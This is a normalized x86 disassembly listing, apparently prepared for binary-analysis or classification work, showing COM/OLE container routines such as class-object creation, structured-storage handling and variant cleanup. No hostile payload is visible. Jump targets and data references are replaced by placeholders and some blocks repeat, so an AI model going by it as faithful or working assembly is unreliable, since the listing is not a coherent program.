call sub_4221b9
mov [ ebp + 0x8 ] eax
mov eax [ esi - 0x24 ]
xor edi edi
pop ecx
neg eax
sbb eax eax
mov [ ebp - 0x1c ] eax
xor esi esi
jmp r-xdata
push 0x1
mov ecx esi
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
push 0x4
call sub_428763
mov [ esi ] r--data
jmp r-xdata
lea eax [ ebp + 0xc ]
lea ecx [ esi - 0x30 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call sub_41e5bb
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4c ]
push eax
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax + 0x4c ]
mov [ ecx + edi * 4 ] eax
mov eax [ ebp - 0x1c ]
inc edi
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] ebx
jl r-xdata
cmp eax ebx
je r-xdata
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax [ ebp + 0x10 ]
add esi 0x34
mov [ eax ] esi
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0xc
mov edi [ ebp - 0x14 ]
cmp edi ebx
jbe r-xdata
mov eax [ esi ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
add esi 0x4
dec edi
jne r-xdata
sub_40a63a
mov esi [ ebp - 0x20 ]
xor ebx ebx
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] ebx
jl r-xdata
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax [ ebp + 0x10 ]
add esi 0x34
mov [ eax ] esi
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0xc
mov edi [ ebp - 0x14 ]
cmp edi ebx
jbe r-xdata
mov eax [ esi ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
add esi 0x4
dec edi
jne r-xdata
sub_40a69e
mov eax sub_42b024
call sub_410a78
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
call sub_421ce9
mov eax [ ebp + 0x8 ]
or [ esi + 0x28 ] 0xffffffff
xor edi edi
lea ecx [ esi + 0x58 ]
mov [ ebp - 0x4 ] edi
mov [ esi + 0x1c ] eax
mov [ esi + 0x24 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
mov [ esi + 0x54 ] edi
call sub_429720
mov [ esi + 0x60 ] edi
mov [ esi + 0x64 ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0x84 ] edi
mov [ esi + 0x88 ] edi
mov [ esi + 0x8c ] edi
mov [ esi + 0x90 ] edi
mov [ esi + 0x94 ] edi
mov [ esi + 0x98 ] edi
mov eax [ rw-data ]
mov [ esi + 0x9c ] eax
mov [ esi + 0xa0 ] edi
mov [ esi + 0xa4 ] edi
mov [ esi + 0xb8 ] r--data
mov [ esi + 0xbc ] r--data
mov [ esi + 0xc0 ] r--data
mov [ esi + 0xc4 ] r--data
mov [ esi + 0xc8 ] r--data
mov [ esi + 0xcc ] r--data
mov [ esi + 0xd0 ] r--data
lea ebx [ esi + 0xa8 ]
push 0x10
mov [ esi + 0xd4 ] r--data
push edi
mov [ esi + 0xd8 ] r--data
push ebx
mov [ esi ] r--data
call sub_410a20
mov ecx [ ebp - 0xc ]
add esp 0xc
mov [ ebx ] di
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
sub_40a7c1
mov eax sub_42b051
call sub_410a78
push ecx
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov edi [ esi + 0x88 ]
xor ebx ebx
cmp edi ebx
mov [ ebp - 0x4 ] 0x2
je r-xdata
mov ecx esi
call sub_40b62e
push [ esi + 0x60 ]
lea eax [ esi + 0x3c ]
mov ecx esi
push eax
call sub_40b2aa
push [ esi + 0x64 ]
mov ecx esi
push r--data
call sub_40b2aa
push [ esi + 0x84 ]
mov ecx esi
push r--data
call sub_40b2aa
mov eax [ esi + 0x50 ]
cmp eax ebx
je r-xdata
mov ecx edi
call sub_40c668
push edi
call sub_4221e2
pop ecx
mov eax [ esi + 0x54 ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
mov eax [ esi + 0x50 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov [ esi + 0x50 ] ebx
mov eax [ esi + 0x4c ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov [ esi + 0x54 ] ebx
lea eax [ esi + 0xa8 ]
push eax
call [ VariantClear@IAT ]
push ebx
push 0xffffffff
mov ecx esi
call sub_40beb1
cmp [ esi + 0x94 ] ebx
je r-xdata
mov ecx [ eax ]
push ebx
push eax
call [ ecx + 0xc ]
mov eax [ esi + 0x4c ]
push 0x1
push eax
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esi + 0x4c ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov [ esi + 0x4c ] ebx
lea ecx [ esi + 0x9c ]
mov [ ebp - 0x4 ] 0x1
call sub_422478
lea ecx [ esi + 0x58 ]
mov [ ebp - 0x4 ] bl
call sub_429746
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_421d03
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ esi + 0x90 ]
cmp eax ebx
je r-xdata
mov ecx [ eax + 0x88 ]
cmp ecx ebx
je r-xdata
mov eax [ ecx ]
push ebx
push esi
call [ eax + 0x8 ]
sub_40a8ed
mov eax sub_42b064
call sub_410a78
sub esp 0x1c
push esi
mov esi ecx
push edi
push 0x0
mov ecx [ esi + 0x34 ]
mov eax [ esi + 0x38 ]
sub ecx [ esi + 0x2c ]
sub eax [ esi + 0x30 ]
mov [ ebp - 0x14 ] ecx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
call sub_424b5e
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x28 ]
call sub_426205
mov eax [ esi + 0x4c ]
lea edx [ ebp - 0x14 ]
push edx
push 0x1
mov ecx [ eax ]
push eax
call [ ecx + 0x44 ]
mov edi eax
test edi edi
jl r-xdata
xor eax eax
lea ecx [ ebp - 0x28 ]
test edi edi
setge al
or [ ebp - 0x4 ] 0xffffffff
mov esi eax
call sub_424bd0
mov ecx [ ebp - 0xc ]
mov eax esi
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ esi + 0x4c ]
lea edx [ ebp - 0x14 ]
push edx
push 0x1
mov ecx [ eax ]
push eax
call [ ecx + 0x48 ]
test eax eax
jl r-xdata
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x28 ]
push eax
call sub_426293
mov eax [ ebp - 0x14 ]
add eax [ esi + 0x2c ]
mov [ esi + 0x34 ] eax
mov eax [ esi + 0x30 ]
add eax [ ebp - 0x10 ]
mov [ esi + 0x38 ] eax
sub_40a995
mov eax sub_42b078
call sub_410a78
sub esp 0x2c
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov ebx ecx
xor esi esi
cmp eax esi
mov [ ebx + 0x20 ] esi
je r-xdata
call sub_4270c5
cmp [ eax + 0x114 ] esi
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ eax + 0x38 ] ebx
push edi
mov ecx ebx
push [ ebp + 0x2c ]
push [ ebp + 0x28 ]
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
call sub_40ae8f
cmp eax esi
mov [ ebp + 0x8 ] eax
jl r-xdata
call sub_42808e
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
pop edi
mov eax [ ebp + 0x20 ]
mov [ ebx + 0x28 ] eax
mov eax [ ebp + 0x1c ]
cmp eax esi
jne r-xdata
mov eax 0x80004005
jmp r-xdata
mov ecx [ ebp + 0x18 ]
mov edx [ eax ]
mov esi [ eax + 0x4 ]
lea edi [ ebx + 0x2c ]
mov eax [ ecx ]
mov ecx [ ecx + 0x4 ]
add edx eax
add esi ecx
mov [ ebp - 0x18 ] esi
lea esi [ ebp - 0x24 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x20 ] ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push esi
lea ecx [ ebp - 0x38 ]
call sub_424b5e
mov eax [ ebx + 0x4c ]
lea edx [ ebp - 0x14 ]
push edx
push 0x1
mov ecx [ eax ]
push eax
mov [ ebp - 0x4 ] esi
call [ ecx + 0x48 ]
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x38 ]
push eax
call sub_426293
mov ecx [ ebp + 0x18 ]
mov edx [ ebp - 0x14 ]
lea edi [ ebx + 0x2c ]
lea esi [ ebp - 0x24 ]
mov eax [ ecx ]
mov ecx [ ecx + 0x4 ]
mov [ ebp - 0x24 ] eax
add eax edx
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
add eax ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x18 ] eax
or [ ebp - 0x4 ] 0xffffffff
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea ecx [ ebp - 0x38 ]
movsd [ edi ] [ esi ]
call sub_424bd0
jmp r-xdata
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x28
test ah 0x4
je r-xdata
mov [ ebx + 0x68 ] 0x30001
mov eax [ ebx + 0x70 ]
mov [ ebx + 0x68 ] 0x30000
test ah 0x10
je r-xdata
mov eax [ ebx + 0x68 ]
and eax [ ebp + 0x14 ]
cmp [ ebp + 0x8 ] 0x1
mov [ ebx + 0x6c ] eax
je r-xdata
and [ ebp + 0x17 ] 0xef
lea eax [ ebx + 0xd4 ]
mov ecx ebx
push eax
push r--data
call sub_40b242
mov ecx ebx
mov [ ebx + 0x84 ] eax
call sub_40a8ed
mov eax [ ebx + 0x4c ]
lea edi [ ebx + 0x50 ]
push edi
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
xor esi esi
mov [ ebp + 0x8 ] eax
cmp eax esi
jl r-xdata
lea eax [ ebx + 0xcc ]
mov ecx ebx
push eax
lea eax [ ebx + 0x3c ]
push eax
call sub_40b242
mov [ ebx + 0x60 ] eax
lea eax [ ebx + 0xc8 ]
push eax
push r--data
mov ecx ebx
call sub_40b242
mov [ ebx + 0x64 ] eax
mov eax [ edi ]
cmp eax esi
je r-xdata
test [ ebp + 0x17 ] 0x10
je r-xdata
push [ ebx + 0x60 ]
lea eax [ ebx + 0x3c ]
mov ecx ebx
push eax
call sub_40b2aa
push [ ebx + 0x64 ]
mov ecx ebx
push r--data
call sub_40b2aa
push [ ebx + 0x84 ]
mov ecx ebx
push r--data
call sub_40b2aa
mov eax [ ebx + 0x4c ]
mov [ ebx + 0x60 ] esi
mov [ ebx + 0x64 ] esi
mov [ ebx + 0x84 ] esi
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
cmp [ ebp + 0x8 ] esi
mov [ ebx + 0x4c ] esi
jl r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov [ edi ] esi
mov esi [ OffsetRect@IAT ]
mov eax 0xffff8300
push eax
push eax
lea eax [ ebx + 0x2c ]
push eax
call esi
mov eax [ ebx ]
push 0x0
push 0xfffffffb
mov ecx ebx
call [ eax + 0x54 ]
test eax eax
mov [ ebp + 0x8 ] eax
jl r-xdata
mov eax [ ebx ]
push esi
push 0xfffffffb
mov ecx ebx
call [ eax + 0x54 ]
mov [ ebp + 0x8 ] eax
jmp r-xdata
mov ecx ebx
call sub_40b5f1
cmp [ ebp + 0x10 ] esi
je r-xdata
xor esi esi
mov eax [ ebx ]
push 0x0
push 0xfffffffd
mov ecx ebx
call [ eax + 0x54 ]
test eax eax
mov [ ebp + 0x8 ] eax
jl r-xdata
cmp [ ebp + 0x8 ] esi
jl r-xdata
mov eax [ ebp + 0x14 ]
mov edx [ ebx ]
and eax 0x8800000
push esi
or eax [ ebx + 0x6c ]
mov ecx ebx
push eax
push esi
call [ edx + 0x78 ]
mov eax [ ebx ]
push [ ebp + 0x10 ]
mov ecx ebx
call [ eax + 0x80 ]
mov eax 0x7d00
push eax
push eax
lea eax [ ebx + 0x2c ]
push eax
call esi
mov ecx [ edi ]
lea eax [ ebx + 0x2c ]
push eax
push eax
mov edx [ ecx ]
push ecx
call [ edx + 0x1c ]
mov [ ebp + 0x8 ] eax
xor esi esi
mov ecx ebx
call sub_40b482
jmp r-xdata
sub_40ac32
push esi
mov esi ecx
mov ecx [ esi + 0x1c ]
push [ esi + 0x20 ]
add ecx 0x20
call sub_41e579
mov eax [ esi ]
push 0x0
mov ecx esi
call [ eax + 0xa0 ]
test esi esi
je r-xdata
push 0x1
pop eax
pop esi
retn
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x4 ]
sub_40ac61
push ebp
mov ebp esp
push ecx
push esi
push edi
xor edi edi
cmp [ ebp + 0x1c ] edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edi
push eax
push r--data
push edi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call [ CoGetClassObject@IAT ]
mov esi eax
cmp esi edi
jl r-xdata
lea eax [ ebp + 0x1c ]
mov [ ebp + 0x1c ] edi
push eax
push r--data
push edi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call [ CoGetClassObject@IAT ]
mov esi eax
cmp esi edi
jl r-xdata
mov eax esi
pop edi
pop esi
leave
retn 0x18
push [ ebp + 0x18 ]
mov eax [ ebp - 0x4 ]
push [ ebp + 0x1c ]
mov ecx [ eax ]
push [ ebp + 0x14 ]
push edi
push [ ebp + 0xc ]
push eax
call [ ecx + 0x1c ]
mov esi eax
mov eax [ ebp - 0x4 ]
push [ ebp + 0x18 ]
mov eax [ ebp + 0x1c ]
push [ ebp + 0x14 ]
mov ecx [ eax ]
push [ ebp + 0xc ]
push eax
call [ ecx + 0xc ]
mov esi eax
mov eax [ ebp + 0x1c ]
jmp r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_40acee
mov eax sub_42b08c
call sub_410a78
sub esp 0x70
push ebx
push esi
mov esi ecx
xor ebx ebx
lea edx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] ebx
mov eax [ esi + 0x4c ]
push edx
push r--data
push eax
mov ecx [ eax ]
mov [ ebp - 0x14 ] ebx
call [ ecx ]
test eax eax
jl r-xdata
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
lea eax [ esi + 0xb8 ]
push edi
mov [ ebp - 0x78 ] eax
lea eax [ esi + 0xc8 ]
mov [ ebp - 0x70 ] eax
lea eax [ esi + 0xcc ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x7c ] 0x40
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x48 ] ebx
call sub_40ff70
mov eax [ esi + 0x1c ]
mov [ ebp - 0x4 ] ebx
mov edi [ eax + 0x1c ]
mov [ ebp - 0x68 ] ebx
mov ebx r--data
add ebx 0x8
cmp ebx r--data
jb r-xdata
mov eax [ ebx ]
or [ ebp - 0x68 ] eax
mov eax [ edi ]
lea ecx [ ebp - 0x24 ]
push ecx
mov ecx edi
push [ ebx - 0x4 ]
push esi
call [ eax + 0x94 ]
cmp [ ebp - 0x1c ] 0x0
je r-xdata
mov eax [ edi ]
lea ecx [ ebp - 0x24 ]
push ecx
push 0xfffffd40
push esi
mov ecx edi
call [ eax + 0x94 ]
mov eax [ ebp - 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x64 ] eax
mov eax [ edi ]
push ecx
push 0xfffffd43
push esi
mov ecx edi
call [ eax + 0x94 ]
mov eax [ ebp - 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x60 ] eax
mov eax [ edi ]
push ecx
push 0xfffffd34
push esi
mov ecx edi
call [ eax + 0x94 ]
movsx eax [ ebp - 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x54 ] eax
mov eax [ edi ]
push ecx
push 0xfffffd3f
push esi
mov ecx edi
call [ eax + 0x94 ]
mov eax [ ebp - 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x50 ] eax
mov eax [ edi ]
push ecx
push 0xfffffd41
push esi
mov ecx edi
call [ eax + 0x94 ]
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x5c ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
pop edi
jge r-xdata
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x3c ]
push edx
lea edx [ ebp - 0x7c ]
mov [ ebp - 0x3c ] 0x18
mov ecx [ eax ]
push edx
push eax
call [ ecx + 0xc ]
test eax eax
jl r-xdata
and [ ebp - 0x5c ] 0x0
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x14 ] 0x1
mov [ esi + 0x70 ] eax
mov eax [ ebp - 0x30 ]
mov [ esi + 0x60 ] eax
mov eax [ ebp - 0x2c ]
mov [ esi + 0x64 ] eax
lea eax [ ebp - 0x24 ]
push eax
call [ VariantClear@IAT ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_40ae8f
mov eax sub_42b0a0
call sub_410a78
sub esp 0x64
push ebx
push esi
push edi
mov esi ecx
push [ ebp + 0x14 ]
xor ebx ebx
lea edi [ esi + 0x4c ]
mov [ ebp - 0x24 ] esi
push edi
push r--data
push 0x3
push ebx
push [ ebp + 0x8 ]
call sub_40ac61
cmp eax ebx
mov [ ebp + 0x14 ] eax
jl r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x10
lea eax [ esi + 0x3c ]
mov ecx esi
push eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp + 0x8 ] ebx
call sub_40b308
mov eax [ esi ]
mov ecx esi
call [ eax + 0xbc ]
cmp eax ebx
mov [ ebp - 0x20 ] eax
jne r-xdata
mov esi [ ebp + 0xc ]
cmp esi ebx
je r-xdata
mov eax [ edi ]
lea ecx [ esi + 0x70 ]
push ecx
push 0x1
mov edx [ eax ]
push eax
call [ edx + 0x58 ]
test [ esi + 0x72 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ edi ]
add esi 0xb8
push esi
push eax
mov ecx [ eax ]
call [ ecx + 0xc ]
cmp eax ebx
mov [ ebp + 0x14 ] eax
jl r-xdata
mov eax [ edi ]
lea edx [ ebp - 0x14 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ edi ]
lea edx [ ebp - 0x10 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ edi ]
lea edx [ ebp + 0x8 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jge r-xdata
cmp esi ebx
jne r-xdata
cmp esi ebx
jne r-xdata
mov eax [ esi ]
push ebx
push ebx
push ebx
push 0x3
mov ecx esi
call [ eax + 0x50 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
mov ecx [ eax ]
push 0x1
push eax
call [ ecx + 0x18 ]
mov eax [ edi ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov [ edi ] ebx
cmp [ ebp + 0x10 ] ebx
je r-xdata
lea eax [ ebp + 0xc ]
mov [ ebp + 0xc ] ebx
push eax
push 0x1
push ebx
call [ CreateILockBytesOnHGlobal@IAT ]
cmp eax ebx
mov [ ebp + 0x14 ] eax
jl r-xdata
push ebx
push 0x1000
push 0x1
push esi
lea ecx [ ebp - 0x70 ]
call sub_425088
lea eax [ ebp - 0x70 ]
lea ecx [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_41dffa
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x2c ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0x14 ]
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x70 ]
mov [ ebp + 0x14 ] eax
call sub_425164
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
mov eax [ esi ]
lea ecx [ ebp + 0xc ]
push ecx
lea ecx [ ebp + 0x10 ]
push ecx
push 0xffffffff
push ebx
mov ecx esi
mov [ ebp + 0x10 ] ebx
call [ eax + 0x50 ]
mov ecx [ ebp + 0x8 ]
push eax
push [ ebp + 0x10 ]
mov edx [ ecx ]
push ecx
call [ edx + 0x14 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov [ ebp + 0x8 ] ebx
jmp r-xdata
cmp [ ebp - 0x20 ] ebx
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov [ ebp + 0x14 ] 0x8000ffff
mov eax [ esi ]
mov ecx esi
call [ eax + 0x30 ]
push eax
push ebx
mov [ ebp + 0xc ] eax
call [ GlobalAlloc@IAT ]
cmp eax ebx
mov [ ebp + 0x10 ] eax
je r-xdata
mov eax [ ebp - 0x14 ]
lea eax [ ebp + 0x10 ]
mov [ ebp + 0x10 ] ebx
push eax
push ebx
push 0x1012
push [ ebp + 0xc ]
call [ StgCreateDocfileOnILockBytes@IAT ]
cmp eax ebx
mov [ ebp + 0x14 ] eax
jl r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ ebp - 0x10 ]
jmp r-xdata
cmp [ ebp + 0x14 ] ebx
jl r-xdata
mov eax [ ebp + 0x14 ]
cmp [ ebp + 0x14 ] ebx
jl r-xdata
cmp [ ebp - 0x20 ] ebx
jne r-xdata
mov [ ebp + 0x14 ] 0x8007000e
mov [ ebp + 0x10 ] ebx
push eax
call [ GlobalLock@IAT ]
cmp eax ebx
je r-xdata
mov eax [ ebp + 0xc ]
mov eax [ ebp - 0x14 ]
push [ ebp + 0x10 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov [ ebp + 0x14 ] 0x1
mov ecx [ ebp - 0x24 ]
test [ ecx + 0x72 ] 0x2
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
push [ ebp + 0x10 ]
call [ CreateILockBytesOnHGlobal@IAT ]
cmp eax ebx
mov [ ebp + 0x14 ] eax
jl r-xdata
push [ ebp + 0xc ]
mov edx [ esi ]
mov ecx esi
push eax
call [ edx + 0x34 ]
push [ ebp + 0x10 ]
call [ GlobalUnlock@IAT ]
jmp r-xdata
mov eax [ edi ]
add ecx 0xb8
push ecx
push eax
mov edx [ eax ]
call [ edx + 0xc ]
mov [ ebp + 0x14 ] eax
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x18 ] ebx
push eax
push ebx
push ebx
push 0x12
push ebx
push [ ebp - 0x1c ]
call [ StgOpenStorageOnILockBytes@IAT ]
cmp eax ebx
mov [ ebp + 0x14 ] eax
jl r-xdata
cmp [ ebp + 0x10 ] ebx
mov [ ebp - 0x1c ] ebx
je r-xdata
mov eax [ ebp - 0x1c ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
push [ ebp - 0x18 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
jmp r-xdata
sub_40b19d
push esi
lea esi [ ecx + 0x2c ]
mov eax [ ecx + 0x4c ]
push esi
mov esi [ ecx + 0x1c ]
add ecx 0xb8
mov edx [ eax ]
mov esi [ esi + 0x1c ]
push [ esi + 0x1c ]
push 0x0
push ecx
push [ esp + 0x1c ]
push [ esp + 0x1c ]
push eax
call [ edx + 0x2c ]
pop esi
retn 0x8
sub_40b1f2
push ebp
mov ebp esp
test [ ecx + 0x71 ] 0x10
je r-xdata
pop ebp
retn 0x4
mov eax [ ecx + 0x6c ]
mov edx eax
and edx 0x1
cmp edx [ ebp + 0x8 ]
je r-xdata
and [ ebp + 0x8 ] 0x0
xor eax 0x1
mov [ ecx + 0x6c ] eax
mov ecx [ ecx + 0x4c ]
lea edx [ ebp + 0x8 ]
mov eax [ ecx ]
push edx
push r--data
push ecx
call [ eax ]
test eax eax
jl r-xdata
mov eax [ ebp + 0x8 ]
push 0xfffffd37
push eax
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_40b242
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ecx + 0x4c ]
test eax eax
je r-xdata
xor eax eax
mov ecx [ eax ]
lea edx [ ebp - 0x8 ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
and [ ebp - 0x4 ] 0x0
and [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x4 ]
mov ecx [ eax ]
push edx
push [ ebp + 0x8 ]
push eax
call [ ecx + 0x10 ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0xc ]
push edx
push [ ebp + 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
leave
retn 0x8
sub_40b2aa
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0xc ] 0x0
je r-xdata
leave
retn 0x8
mov eax [ ecx + 0x4c ]
test eax eax
je r-xdata
mov ecx [ eax ]
lea edx [ ebp - 0x8 ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
and [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x4 ]
mov ecx [ eax ]
push edx
push [ ebp + 0x8 ]
push eax
call [ ecx + 0x10 ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
push [ ebp + 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x18 ]
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_40b308
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi r--data
mov ebx ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebx + 0x4c ]
xor edi edi
lea edx [ ebp - 0xc ]
mov [ ebp - 0xc ] edi
mov ecx [ eax ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
push 0x10
push r--data
push [ ebp + 0x8 ]
mov [ ebp - 0x14 ] edi
call sub_410ae0
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
push [ ebp + 0x8 ]
mov ecx [ eax ]
push 0x1
push eax
call [ ecx + 0x10 ]
mov eax [ ebp - 0xc ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
push 0x10
push r--data
push [ ebp + 0x8 ]
call sub_410ae0
add esp 0xc
neg eax
sbb eax eax
pop edi
pop esi
pop ebx
neg eax
leave
retn 0x4
mov ebx [ ebx + 0x4c ]
lea ecx [ ebp - 0x14 ]
push ecx
push r--data
mov eax [ ebx ]
push ebx
call [ eax ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edi
push edx
mov ecx [ eax ]
push eax
call [ ecx + 0xc ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
lea edx [ ebp - 0x10 ]
push edx
push eax
mov ecx [ eax ]
call [ ecx + 0xc ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x10 ]
xor esi esi
cmp [ eax + 0x30 ] di
jbe r-xdata
mov eax [ ebp - 0x4 ]
push [ ebp - 0x10 ]
